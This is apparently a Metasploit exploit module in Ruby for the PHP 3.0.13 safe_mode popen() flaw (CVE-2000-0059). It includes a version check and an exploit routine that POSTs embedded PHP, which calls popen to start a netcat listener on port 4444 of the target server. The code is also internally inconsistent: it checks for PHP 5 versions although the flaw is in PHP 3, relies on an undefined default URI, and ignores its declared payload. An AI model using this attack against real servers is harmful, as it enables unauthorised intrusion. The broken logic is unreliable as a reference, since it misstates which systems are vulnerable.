##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PHP 3.0.13 - safe_mode Failure',
      'Description'    => %q{
          PHP Version 3.0 is an HTML-embedded scripting language. Much of its syntax is borrowed from C, Java and Perl with a couple of unique PHP-specific features thrown in. The goal of the language is to allow web developers to write dynamically generated pages quickly. 
Because it runs on a webserver and allows for user implemented (and perhaps security relevant) code to be executed on it, PHP has built in a security feature called 'safe_mode' to control executed commands to the webroot environment which PHP operates in.
This is done by forcing any system call which executes shell commands to have their shell commands passed to the EscapeShellCmd() function which ensures the commands do not take place outside the webroot directory. 
Under certain versions of PHP however, the popen() command fails to be applied to the EscapeShellCmd() command and as such users can possibly exploit PHP applications running in 'safe_mode' which make of use of the 'popen' system call.
      },
      'Author'         =>
        [
          'Zack Nagaich',                                        # module development
          'Zack Nagaich <zacknagaich[at]gmail.com>',      # module development and debugging
          'Stefan Esser <sesser[at]hardened-php.net>' # discovered, patched, exploited
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2000-0059'],
          ['URL', 'http://www.securityfocus.com/bid/911/info'],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
        },
      'Platform'       => %w{ linux },
      'Targets'        =>
        [
	  [ 'Linux x86 Generic',
	   {
              'Platform'      => 'linux',
              'Arch'          => [ ARCH_X86 ]
           }
          ]
        ]))

      register_options(
        [
          OptString.new('URI', [false, "The path to vulnerable PHP script"])
        ], self.class)
  end


  def check
    vprint_status("Checking for a vulnerable PHP version...")

    #
    # Pick the URI and Cookie name
    #
    uri_path    = normalize_uri(datastore['URI']) || target['DefaultURI']

    if(not uri_path)
      fail_with(Failure::Unknown, "The URI option must be set")
    end

    res = send_request_cgi({
      'uri'     => uri_path,
      'method'    => 'GET'
    }, 5)

    php_bug = false

    if (not res)
      vprint_status("No response from the server")
      return Exploit::CheckCode::Unknown # User should try again
    end

    http_fingerprint({ :response => res })  # check method

    if (res.code != 200)
      vprint_status("The server returned #{res.code} #{res.message}")
      return Exploit::CheckCode::Safe
    end

    if (
        (res.headers['X-Powered-By'] and res.headers['X-Powered-By'] =~ /PHP\/(.*)/) or
        (res.headers['Server'] and res.headers['Server'] =~ /PHP\/(.*)/)
      )

      php_raw = $1
      php_ver = php_raw.split('.')

      if (php_ver[0].to_i == 5 and php_ver[1] and php_ver[2] and php_ver[1].to_i <= 2)
        vprint_status("The server runs a vulnerable version of PHP (#{php_raw})")
        php_bug = true
      else
        vprint_status("The server runs a non-vulnerable version of PHP (#{php_raw})")
        return Exploit::CheckCode::Safe
      end
    end

    if(target and target['Signature'])
      if (res.body and res.body.match(target['Signature']))
        vprint_status("Detected target #{target.name}")
      else
        vprint_status("Did not detect target #{target.name}")
      end

    end

    return php_bug ? Exploit::CheckCode::Appears : Exploit::CheckCode::Detected
  end

  def exploit
    php_code = '''
      <?php
        $fp = popen("nc -l 4444","r");
        echo "$fp<br>\n";
        while($line = fgets($fp,1024)):
          printf("%s<br>\n",$line);
        endwhile;
        pclose($fp)
      ?>
    '''

   uri_path    = normalize_uri(datastore['URI']) || target['DefaultURI']

   if(not uri_path)
      fail_with(Failure::Unknown, "The URI option must be set")
    end

    # Generate and reuse the payload to save CPU time
    if (not @saved_payload)
      @saved_payload = php_code
    end
    
    print_status("Sending php exploit to %s..." % uri_path)
    res = send_request_cgi({
      'uri'		  => uri_path,
      'method'	  => 'POST',
      'data'        => @saved_payload
    }, 1)


    if res
      failed = false

      print_status("Received a response: #{res.code} #{res.message}")

      if (res.code != 200)
        print_error("The server returned a non-200 response, indicating that the exploit failed.")
        failed = true
      end

      if (not failed and (res.body and res.body.length > 0))
        print_error("The server returned a real response, indicating that the exploit failed.")
        failed = true
      end

      if (failed)
          fail_with(Failure::Unknown, "Exploit settings are probably wrong")
      end
    else
      print_status("No response from the server")
    end
  end
end 
